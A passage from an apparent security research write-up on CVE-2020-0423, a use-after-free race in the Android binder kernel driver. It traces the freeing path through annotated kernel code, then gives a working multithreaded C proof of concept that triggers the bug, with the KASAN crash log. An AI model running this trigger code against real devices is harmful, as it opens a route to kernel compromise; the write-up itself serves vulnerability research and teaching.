            <span class="k">if</span> <span class="p">(</span><span class="n">func</span><span class="p">)</span> <span class="p">{</span>
                <span class="c1">// [...]</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">txn</span><span class="p">.</span><span class="n">transaction_data</span><span class="p">.</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">TF_ONE_WAY</span><span class="p">)</span> <span class="p">{</span>
                    <span class="n">binder_free_buffer</span><span class="p">(</span><span class="n">bs</span><span class="p">,</span> <span class="n">txn</span><span class="p">.</span><span class="n">transaction_data</span><span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">ptr</span><span class="p">.</span><span class="n">buffer</span><span class="p">);</span>
                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                    <span class="n">binder_send_reply</span><span class="p">(</span><span class="n">bs</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">reply</span><span class="p">,</span> <span class="n">txn</span><span class="p">.</span><span class="n">transaction_data</span><span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">ptr</span><span class="p">.</span><span class="n">buffer</span><span class="p">,</span> <span class="n">res</span><span class="p">);</span>
                <span class="p">}</span>
            <span class="p">}</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="c1">// [...]</span>
</code></pre></div>

<p>In both cases, <code>servicemanager</code> will answer with a <code>BC_FREE_BUFFER</code>. Now we can describe how this command is able to free the binder node that was created by the sending thread.</p>
<p>When the targeted service answers back with a <code>BC_FREE_BUFFER</code>, the transaction is handled by <a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/drivers/android/binder.c#3643"><code>binder_thread_write</code></a>. The execution flow will reach the <a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/drivers/android/binder.c#3804"><code>BC_FREE_BUFFER</code></a> case and, at the end, will call <a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/drivers/android/binder.c#3860"><code>binder_transaction_buffer_release</code></a></p>
<div class="codehilite"><pre><span></span><code><span class="k">static</span> <span class="kt">int</span> <span class="n">binder_thread_write</span><span class="p">(</span><span class="k">struct</span> <span class="nc">binder_proc</span> <span class="o">*</span><span class="n">proc</span><span class="p">,</span>
            <span class="k">struct</span> <span class="nc">binder_thread</span> <span class="o">*</span><span class="kr">thread</span><span class="p">,</span>
            <span class="n">binder_uintptr_t</span> <span class="n">binder_buffer</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">,</span>
            <span class="n">binder_size_t</span> <span class="o">*</span><span class="n">consumed</span><span class="p">)</span>
<span class="p">{</span>
        <span class="c1">// [...]</span>
        <span class="k">case</span> <span class="nl">BC_FREE_BUFFER</span><span class="p">:</span> <span class="p">{</span>
            <span class="c1">// [...]</span>
            <span class="n">binder_transaction_buffer_release</span><span class="p">(</span><span class="n">proc</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">false</span><span class="p">);</span>
            <span class="c1">// [...]</span>
        <span class="p">}</span>
        <span class="c1">// [...]</span>
</code></pre></div>

<p><a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/drivers/android/binder.c#2365"><code>binder_transaction_buffer_release</code></a> will then look at the type of the object stored in the buffer, in our case a <code>BINDER_TYPE_WEAK_HANDLE</code> or <code>BINDER_TYPE_HANDLE</code> (because binder objects are translated to handles when they go through binder), and start freeing them.</p>
<div class="codehilite"><pre><span></span><code><span class="k">static</span> <span class="kt">void</span> <span class="n">binder_transaction_buffer_release</span><span class="p">(</span><span class="k">struct</span> <span class="nc">binder_proc</span> <span class="o">*</span><span class="n">proc</span><span class="p">,</span>
                          <span class="k">struct</span> <span class="nc">binder_buffer</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span>
                          <span class="n">binder_size_t</span> <span class="n">failed_at</span><span class="p">,</span>
                          <span class="kt">bool</span> <span class="n">is_failure</span><span class="p">)</span>
<span class="p">{</span>
        <span class="c1">// [...]</span>
        <span class="k">switch</span> <span class="p">(</span><span class="n">hdr</span><span class="o">-&gt;</span><span class="n">type</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// [...]</span>
        <span class="k">case</span> <span class="nl">BINDER_TYPE_HANDLE</span><span class="p">:</span>
        <span class="k">case</span> <span class="nl">BINDER_TYPE_WEAK_HANDLE</span><span class="p">:</span> <span class="p">{</span>
            <span class="k">struct</span> <span class="nc">flat_binder_object</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
            <span class="k">struct</span> <span class="nc">binder_ref_data</span> <span class="n">rdata</span><span class="p">;</span>
            <span class="kt">int</span> <span class="n">ret</span><span class="p">;</span>
            <span class="n">fp</span> <span class="o">=</span> <span class="n">to_flat_binder_object</span><span class="p">(</span><span class="n">hdr</span><span class="p">);</span>
            <span class="n">ret</span> <span class="o">=</span> <span class="n">binder_dec_ref_for_handle</span><span class="p">(</span><span class="n">proc</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">handle</span><span class="p">,</span>
                <span class="n">hdr</span><span class="o">-&gt;</span><span class="n">type</span> <span class="o">==</span> <span class="n">BINDER_TYPE_HANDLE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">rdata</span><span class="p">);</span>
            <span class="c1">// [...]</span>
        <span class="p">}</span> <span class="k">break</span><span class="p">;</span>
        <span class="c1">// [...]</span>
</code></pre></div>

<p><a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/drivers/android/binder.c#2430"><code>binder_transaction_buffer_release</code></a> calls <a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/drivers/android/binder.c#1918"><code>binder_dec_ref_for_handle</code></a>, which is a wrapper for <a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/drivers/android/binder.c#1875"><code>binder_update_ref_for_handle</code></a>. </p>
<p><code>binder_update_ref_for_handle</code> will decrement the reference on the handle, and therefore on the binder node, with <a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/drivers/android/binder.c#1777"><code>binder_dec_ref_olocked</code></a>.</p>
<div class="codehilite"><pre><span></span><code><span class="k">static</span> <span class="kt">int</span> <span class="n">binder_update_ref_for_handle</span><span class="p">(</span><span class="k">struct</span> <span class="nc">binder_proc</span> <span class="o">*</span><span class="n">proc</span><span class="p">,</span>
        <span class="kt">uint32_t</span> <span class="n">desc</span><span class="p">,</span> <span class="kt">bool</span> <span class="n">increment</span><span class="p">,</span> <span class="kt">bool</span> <span class="n">strong</span><span class="p">,</span>
        <span class="k">struct</span> <span class="nc">binder_ref_data</span> <span class="o">*</span><span class="n">rdata</span><span class="p">)</span>
<span class="p">{</span>
    <span class="c1">// [...]</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">increment</span><span class="p">)</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="n">binder_inc_ref_olocked</span><span class="p">(</span><span class="n">ref</span><span class="p">,</span> <span class="n">strong</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="k">else</span>
        <span class="cm">/* </span>
<span class="cm">         * Decrements the reference count by one and returns true since it</span>
<span class="cm">         * dropped to zero</span>
<span class="cm">         */</span>
        <span class="n">delete_ref</span> <span class="o">=</span> <span class="n">binder_dec_ref_olocked</span><span class="p">(</span><span class="n">ref</span><span class="p">,</span> <span class="n">strong</span><span class="p">);</span>
    <span class="c1">// [...]</span>
    <span class="cm">/* delete_ref is true, the binder node is freed */</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">delete_ref</span><span class="p">)</span>
        <span class="n">binder_free_ref</span><span class="p">(</span><span class="n">ref</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
    <span class="c1">// [...]</span>
<span class="p">}</span>
</code></pre></div>

<p>The binder node is finally freed after the call to <code>binder_free_node</code>.</p>
<div class="codehilite"><pre><span></span><code><span class="k">static</span> <span class="kt">void</span> <span class="n">binder_free_ref</span><span class="p">(</span><span class="k">struct</span> <span class="nc">binder_ref</span> <span class="o">*</span><span class="n">ref</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">ref</span><span class="o">-&gt;</span><span class="n">node</span><span class="p">)</span>
        <span class="n">binder_free_node</span><span class="p">(</span><span class="n">ref</span><span class="o">-&gt;</span><span class="n">node</span><span class="p">);</span>
    <span class="n">kfree</span><span class="p">(</span><span class="n">ref</span><span class="o">-&gt;</span><span class="n">death</span><span class="p">);</span>
    <span class="n">kfree</span><span class="p">(</span><span class="n">ref</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<h3 id="cve-2020-0423-in-a-nutshell">CVE-2020-0423 in a Nutshell</h3>
<p>To wrap up the analysis of the vulnerability, and before jumping into its exploitation, here's a brief rundown of the steps required to trigger the use-after-free.</p>
<p>First we need a user-controlled thread that will send transactions to a system-controlled binder service (e.g. <code>servicemanager</code>). The sender creates a transaction containing a <code>BINDER_TYPE_BINDER</code> and sends it to binder. Binder creates a <code>binder_node</code> corresponding to the <code>BINDER_TYPE_BINDER</code> object and sends it to <code>servicemanager</code>.</p>
<p><img alt="image" src="./2020 - Exploiting a Single Instruction Race Condition in Binder_files/trigger_step1.png"></p>
<p>Right after, the sender stops the communication with binder using <code>BINDER_THREAD_EXIT</code> which will initiate the clean up process, ultimately calling the vulnerable function <code>binder_release_work</code> that will dequeue the binder node from the <code>thread-&gt;todo</code> list.</p>
<p><img alt="image" src="./2020 - Exploiting a Single Instruction Race Condition in Binder_files/trigger_step2.png"></p>
<p>Finally, if the timing is right, the receiver will respond to our previous transaction with a <code>BC_FREE_BUFFER</code> freeing the binder node right after it's been dequeued and right before it's been used.</p>
<p><img alt="image" src="./2020 - Exploiting a Single Instruction Race Condition in Binder_files/trigger_step3.png"></p>
<p>At this point, with some spraying, it would be possible to replace the binder node with another object and take control of the <code>type</code> field in the <code>binder_work</code> structure to modify the execution flow of binder.</p>
<div class="codehilite"><pre><span></span><code><span class="k">static</span> <span class="kt">void</span> <span class="n">binder_release_work</span><span class="p">(</span><span class="k">struct</span> <span class="nc">binder_proc</span> <span class="o">*</span><span class="n">proc</span><span class="p">,</span>
                <span class="k">struct</span> <span class="nc">list_head</span> <span class="o">*</span><span class="n">list</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="nc">binder_work</span> <span class="o">*</span><span class="n">w</span><span class="p">;</span>

    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">w</span> <span class="o">=</span> <span class="n">binder_dequeue_work_head</span><span class="p">(</span><span class="n">proc</span><span class="p">,</span> <span class="n">list</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">w</span><span class="p">)</span>
            <span class="k">return</span><span class="p">;</span>

        <span class="k">switch</span> <span class="p">(</span><span class="n">w</span><span class="o">-&gt;</span><span class="n">type</span><span class="p">)</span> <span class="p">{</span> <span class="cm">/* &lt;--- Use-after-free occurs here */</span>

<span class="c1">// [...]</span>
</code></pre></div>

<!-- TODO: maybe we're not going to do a full root exploit, change this paragraph accordingly -->

<p>The next section will explain how to trigger this vulnerability with a simple proof of concept before detailing a full exploit that can be used to get root access on a Pixel 4 device.</p>
<h2 id="exploiting-the-vulnerability">Exploiting the Vulnerability</h2>
<h3 id="writing-a-proof-of-concept">Writing a Proof of Concept</h3>
<p>Before trying to write a complete exploit for this vulnerability, let's try to trigger the bug a KASAN-enabled kernel running on a Pixel 4 device. The steps to build a KASAN kernel for a Pixel device are detailed <a href="https://source.android.com/devices/tech/debug/kasan-kcov">here</a>.</p>
<p>The proof of concept can be divided into three stages:</p>
<ol>
<li>generating a transaction capable of triggering the bug</li>
<li>sending the transaction and <code>BINDER_THREAD_EXIT</code> to binder</li>
<li>using multiple threads to trigger the race condition more effectively</li>
</ol>
<p>First, let's have a look at the transaction we need to send. It requires at least one <code>BINDER_TYPE_BINDER</code>, or <code>BINDER_TYPE_WEAK_BINDER</code>, object. It's possible to send more than one to up the chances of triggering the bug, since the more nodes there are in <code>thread-&gt;todo</code> the likelier a given transaction can trigger the bug.</p>
<p>Following binder transactions format, we could generate one with the following layout:</p>
<p><img alt="image" src="./2020 - Exploiting a Single Instruction Race Condition in Binder_files/transaction_layout.png"></p>
<p>The following function can be used to create a transaction such as the one represented above.</p>
<div class="codehilite"><pre><span></span><code><span class="cm">/*</span>
<span class="cm"> * Generates a binder transaction able to trigger the bug</span>
<span class="cm"> */</span>
<span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="n">init_binder_transaction</span><span class="p">(</span><span class="kt">int</span> <span class="n">nb</span><span class="p">)</span> <span class="p">{</span>
    <span class="cm">/*</span>
<span class="cm">     * Writes `nb` times a BINDER_TYPE_BINDER object in the object buffer</span>
<span class="cm">     * and updates the offsets in the offset buffer accordingly</span>
<span class="cm">     */</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">nb</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">struct</span> <span class="nc">flat_binder_object</span> <span class="o">*</span><span class="n">fbo</span> <span class="o">=</span>
            <span class="p">(</span><span class="k">struct</span> <span class="nc">flat_binder_object</span> <span class="o">*</span><span class="p">)((</span><span class="kt">void</span><span class="o">*</span><span class="p">)(</span><span class="n">MEM_ADDR</span> <span class="o">+</span> <span class="mh">0x400LL</span> <span class="o">+</span> <span class="n">i</span><span class="o">*</span><span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">fbo</span><span class="p">)));</span>
        <span class="n">fbo</span><span class="o">-&gt;</span><span class="n">hdr</span><span class="p">.</span><span class="n">type</span> <span class="o">=</span> <span class="n">BINDER_TYPE_BINDER</span><span class="p">;</span>
        <span class="n">fbo</span><span class="o">-&gt;</span><span class="n">binder</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
        <span class="n">fbo</span><span class="o">-&gt;</span><span class="n">cookie</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
        <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">MEM_ADDR</span> <span class="o">+</span> <span class="n">OFFSETS_START</span> <span class="o">+</span> <span class="mf">8L</span><span class="n">L</span><span class="o">*</span><span class="n">i</span><span class="p">));</span>
        <span class="o">*</span><span class="n">offset</span> <span class="o">=</span> <span class="n">i</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">fbo</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="cm">/*</span>
<span class="cm">     * Binder transaction data referencing the offset and object buffers</span>
<span class="cm">     */</span>
    <span class="k">struct</span> <span class="nc">binder_transaction_data</span> <span class="n">btd2</span> <span class="o">=</span> <span class="p">{</span>
        <span class="p">.</span><span class="n">flags</span> <span class="o">=</span> <span class="n">TF_ONE_WAY</span><span class="p">,</span> <span class="cm">/* we don't need a reply */</span>
        <span class="p">.</span><span class="n">data_size</span> <span class="o">=</span> <span class="mh">0x28</span> <span class="o">*</span> <span class="n">nb</span><span class="p">,</span>
        <span class="p">.</span><span class="n">offsets_size</span> <span class="o">=</span> <span class="mi">8</span> <span class="o">*</span> <span class="n">nb</span><span class="p">,</span>
        <span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">ptr</span><span class="p">.</span><span class="n">buffer</span> <span class="o">=</span> <span class="n">MEM_ADDR</span>  <span class="o">+</span> <span class="mh">0x400</span><span class="p">,</span>
        <span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">ptr</span><span class="p">.</span><span class="n">offsets</span> <span class="o">=</span> <span class="n">MEM_ADDR</span> <span class="o">+</span> <span class="n">OFFSETS_START</span><span class="p">,</span>
    <span class="p">};</span>

    <span class="kt">uint64_t</span> <span class="n">txn_size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">uint32_t</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">btd2</span><span class="p">);</span>

    <span class="cm">/* Transaction command */</span>
    <span class="o">*</span><span class="p">(</span><span class="kt">uint32_t</span><span class="o">*</span><span class="p">)(</span><span class="n">MEM_ADDR</span> <span class="o">+</span> <span class="mh">0x200</span><span class="p">)</span> <span class="o">=</span> <span class="n">BC_TRANSACTION</span><span class="p">;</span>
    <span class="n">memcpy</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)(</span><span class="n">MEM_ADDR</span> <span class="o">+</span> <span class="mh">0x204</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">btd2</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">btd2</span><span class="p">));</span>

    <span class="cm">/* Binder write/read structure sent to binder */</span>
    <span class="k">struct</span> <span class="nc">binder_write_read</span> <span class="n">bwr</span> <span class="o">=</span> <span class="p">{</span>
        <span class="p">.</span><span class="n">write_size</span> <span class="o">=</span> <span class="n">txn_size</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="c1">// 1 txno</span>
        <span class="p">.</span><span class="n">write_buffer</span> <span class="o">=</span> <span class="n">MEM_ADDR</span> <span class="o">+</span> <span class="mh">0x200</span>
    <span class="p">};</span>
    <span class="n">memcpy</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)(</span><span class="n">MEM_ADDR</span> <span class="o">+</span> <span class="mh">0x100</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">bwr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">bwr</span><span class="p">));</span>
<span class="p">}</span>
</code></pre></div>

<p>The next step is to open a communication channel with binder, send the transaction and close it with <code>BINDER_THREAD_EXIT</code>:</p>
<div class="codehilite"><pre><span></span><code><span class="kt">void</span> <span class="o">*</span><span class="nf">trigger_thread_func</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">argp</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">id</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">argp</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">binder_fd</span> <span class="o">=</span> <span class="mi">-1</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">binder_fd_copy</span> <span class="o">=</span> <span class="mi">-1</span><span class="p">;</span>

    <span class="c1">// Opening binder device</span>
    <span class="n">binder_fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/binder"</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">binder_fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"An error occured while opening binder"</span><span class="p">);</span>

    <span class="k">for</span> <span class="p">(;;)</span> <span class="p">{</span>
        <span class="c1">// Refill the memory region with the transaction</span>
        <span class="n">init_binder_transaction</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
        <span class="c1">// Copying the binder fd</span>
        <span class="n">binder_fd_copy</span> <span class="o">=</span> <span class="n">dup</span><span class="p">(</span><span class="n">binder_fd</span><span class="p">);</span>
        <span class="c1">// Sending the transaction</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">binder_fd_copy</span><span class="p">,</span> <span class="n">BINDER_WRITE_READ</span><span class="p">,</span> <span class="n">MEM_ADDR</span> <span class="o">+</span> <span class="mh">0x100</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
            <span class="n">debug_printf</span><span class="p">(</span><span class="s">"BINDER_WRITE_READ did not work: %d"</span><span class="p">,</span> <span class="n">ret</span><span class="p">);</span>
        <span class="c1">// Binder thread exit</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">binder_fd_copy</span><span class="p">,</span> <span class="n">BINDER_THREAD_EXIT</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
            <span class="n">debug_printf</span><span class="p">(</span><span class="s">"BINDER_WRITE_EXIT did not work: %d"</span><span class="p">,</span> <span class="n">ret</span><span class="p">);</span>
        <span class="c1">// Closing binder device</span>
        <span class="n">close</span><span class="p">(</span><span class="n">binder_fd_copy</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>

<p>Finally, let's start multiple threads to try to trigger the bug quicker.</p>
<div class="codehilite"><pre><span></span><code><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">pthread_t</span> <span class="n">trigger_threads</span><span class="p">[</span><span class="n">NB_TRIGGER_THREADS</span><span class="p">];</span>

    <span class="c1">// Memory region for binder transactions</span>
    <span class="n">mmap</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">MEM_ADDR</span><span class="p">,</span> <span class="n">MEM_SIZE</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span>
         <span class="n">MAP_PRIVATE</span> <span class="o">|</span> <span class="n">MAP_FIXED</span> <span class="o">|</span> <span class="n">MAP_ANONYMOUS</span><span class="p">,</span> <span class="mi">-1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

    <span class="c1">// Init random</span>
    <span class="n">srand</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="mi">0</span><span class="p">));</span>

    <span class="c1">// Get rid of stdout/stderr buffering</span>
    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

    <span class="c1">// Starting trigger threads</span>
    <span class="n">debug_print</span><span class="p">(</span><span class="s">"Starting trigger threads"</span><span class="p">);</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">NB_TRIGGER_THREADS</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">trigger_threads</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">trigger_thread_func</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">i</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="c1">// Waiting for trigger threads</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">NB_TRIGGER_THREADS</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="n">pthread_join</span><span class="p">(</span><span class="n">trigger_threads</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="nb">NULL</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>

<p>After starting the PoC, on a vulnerable KASAN-enabled kernel, the following message should appear in <code>dmesg</code> after some time if the the bug was successfully triggered:</p>
<div class="codehilite"><pre><span></span><code><span class="o">&lt;</span><span class="mi">3</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.367408</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span> <span class="o">==================================================================</span>
<span class="o">&lt;</span><span class="mi">3</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.367435</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span> <span class="n">BUG</span><span class="p">:</span> <span class="n">KASAN</span><span class="p">:</span> <span class="n">use</span><span class="o">-</span><span class="n">after</span><span class="o">-</span><span class="n">free</span> <span class="ow">in</span> <span class="n">binder_release_work</span><span class="o">+</span><span class="mh">0x84</span><span class="o">/</span><span class="mh">0x1b8</span>
<span class="o">&lt;</span><span class="mi">3</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.367469</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span> <span class="n">Read</span> <span class="n">of</span> <span class="n">size</span> <span class="mi">4</span> <span class="n">at</span> <span class="n">addr</span> <span class="n">ffffffc053e45850</span> <span class="n">by</span> <span class="n">task</span> <span class="n">poc</span><span class="o">/</span><span class="mi">20464</span>
<span class="o">&lt;</span><span class="mi">3</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.367481</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span>
<span class="o">&lt;</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.367498</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span> <span class="n">CPU</span><span class="p">:</span> <span class="mi">6</span> <span class="n">PID</span><span class="p">:</span> <span class="mi">20464</span> <span class="n">Comm</span><span class="p">:</span> <span class="n">poc</span> <span class="n">Tainted</span><span class="p">:</span> <span class="n">G</span> <span class="n">S</span>      <span class="n">W</span>       <span class="mf">4.14</span><span class="o">.</span><span class="mi">170</span><span class="o">-</span><span class="n">g551313822</span><span class="o">-</span><span class="n">dirty_audio</span><span class="o">-</span><span class="n">g199e9bf</span> <span class="c1">#1</span>
<span class="o">&lt;</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.367507</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span> <span class="n">Hardware</span> <span class="n">name</span><span class="p">:</span> <span class="n">Qualcomm</span> <span class="n">Technologies</span><span class="p">,</span> <span class="n">Inc</span><span class="o">.</span> <span class="n">SM8150</span> <span class="n">V2</span> <span class="n">PM8150</span> <span class="n">Google</span> <span class="n">Inc</span><span class="o">.</span> <span class="n">MSM</span> <span class="n">sm8150</span> <span class="n">Flame</span> <span class="p">(</span><span class="n">DT</span><span class="p">)</span>
<span class="o">&lt;</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.367514</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span> <span class="n">Call</span> <span class="n">trace</span><span class="p">:</span>
<span class="o">&lt;</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.367530</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span>  <span class="n">dump_backtrace</span><span class="o">+</span><span class="mh">0x0</span><span class="o">/</span><span class="mh">0x380</span>
<span class="o">&lt;</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.367541</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span>  <span class="n">show_stack</span><span class="o">+</span><span class="mh">0x20</span><span class="o">/</span><span class="mh">0x2c</span>
<span class="o">&lt;</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.367554</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span>  <span class="n">dump_stack</span><span class="o">+</span><span class="mh">0xc4</span><span class="o">/</span><span class="mh">0x11c</span>
<span class="o">&lt;</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.367576</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span>  <span class="n">print_address_description</span><span class="o">+</span><span class="mh">0x70</span><span class="o">/</span><span class="mh">0x240</span>
<span class="o">&lt;</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.367594</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span>  <span class="n">kasan_report_error</span><span class="o">+</span><span class="mh">0x1a0</span><span class="o">/</span><span class="mh">0x204</span>
<span class="o">&lt;</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.367605</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span>  <span class="n">kasan_report_error</span><span class="o">+</span><span class="mh">0x0</span><span class="o">/</span><span class="mh">0x204</span>
<span class="o">&lt;</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">[</span><span class="mf">81169.367619</span><span class="p">]</span> <span class="n">c6</span>  <span class="mi">20464</span>  <span class="n">__asan_load4</span><span class="o">+</span><span class="mh">0x80</span><span class="o">/</span><span class="mh">0x84</span>
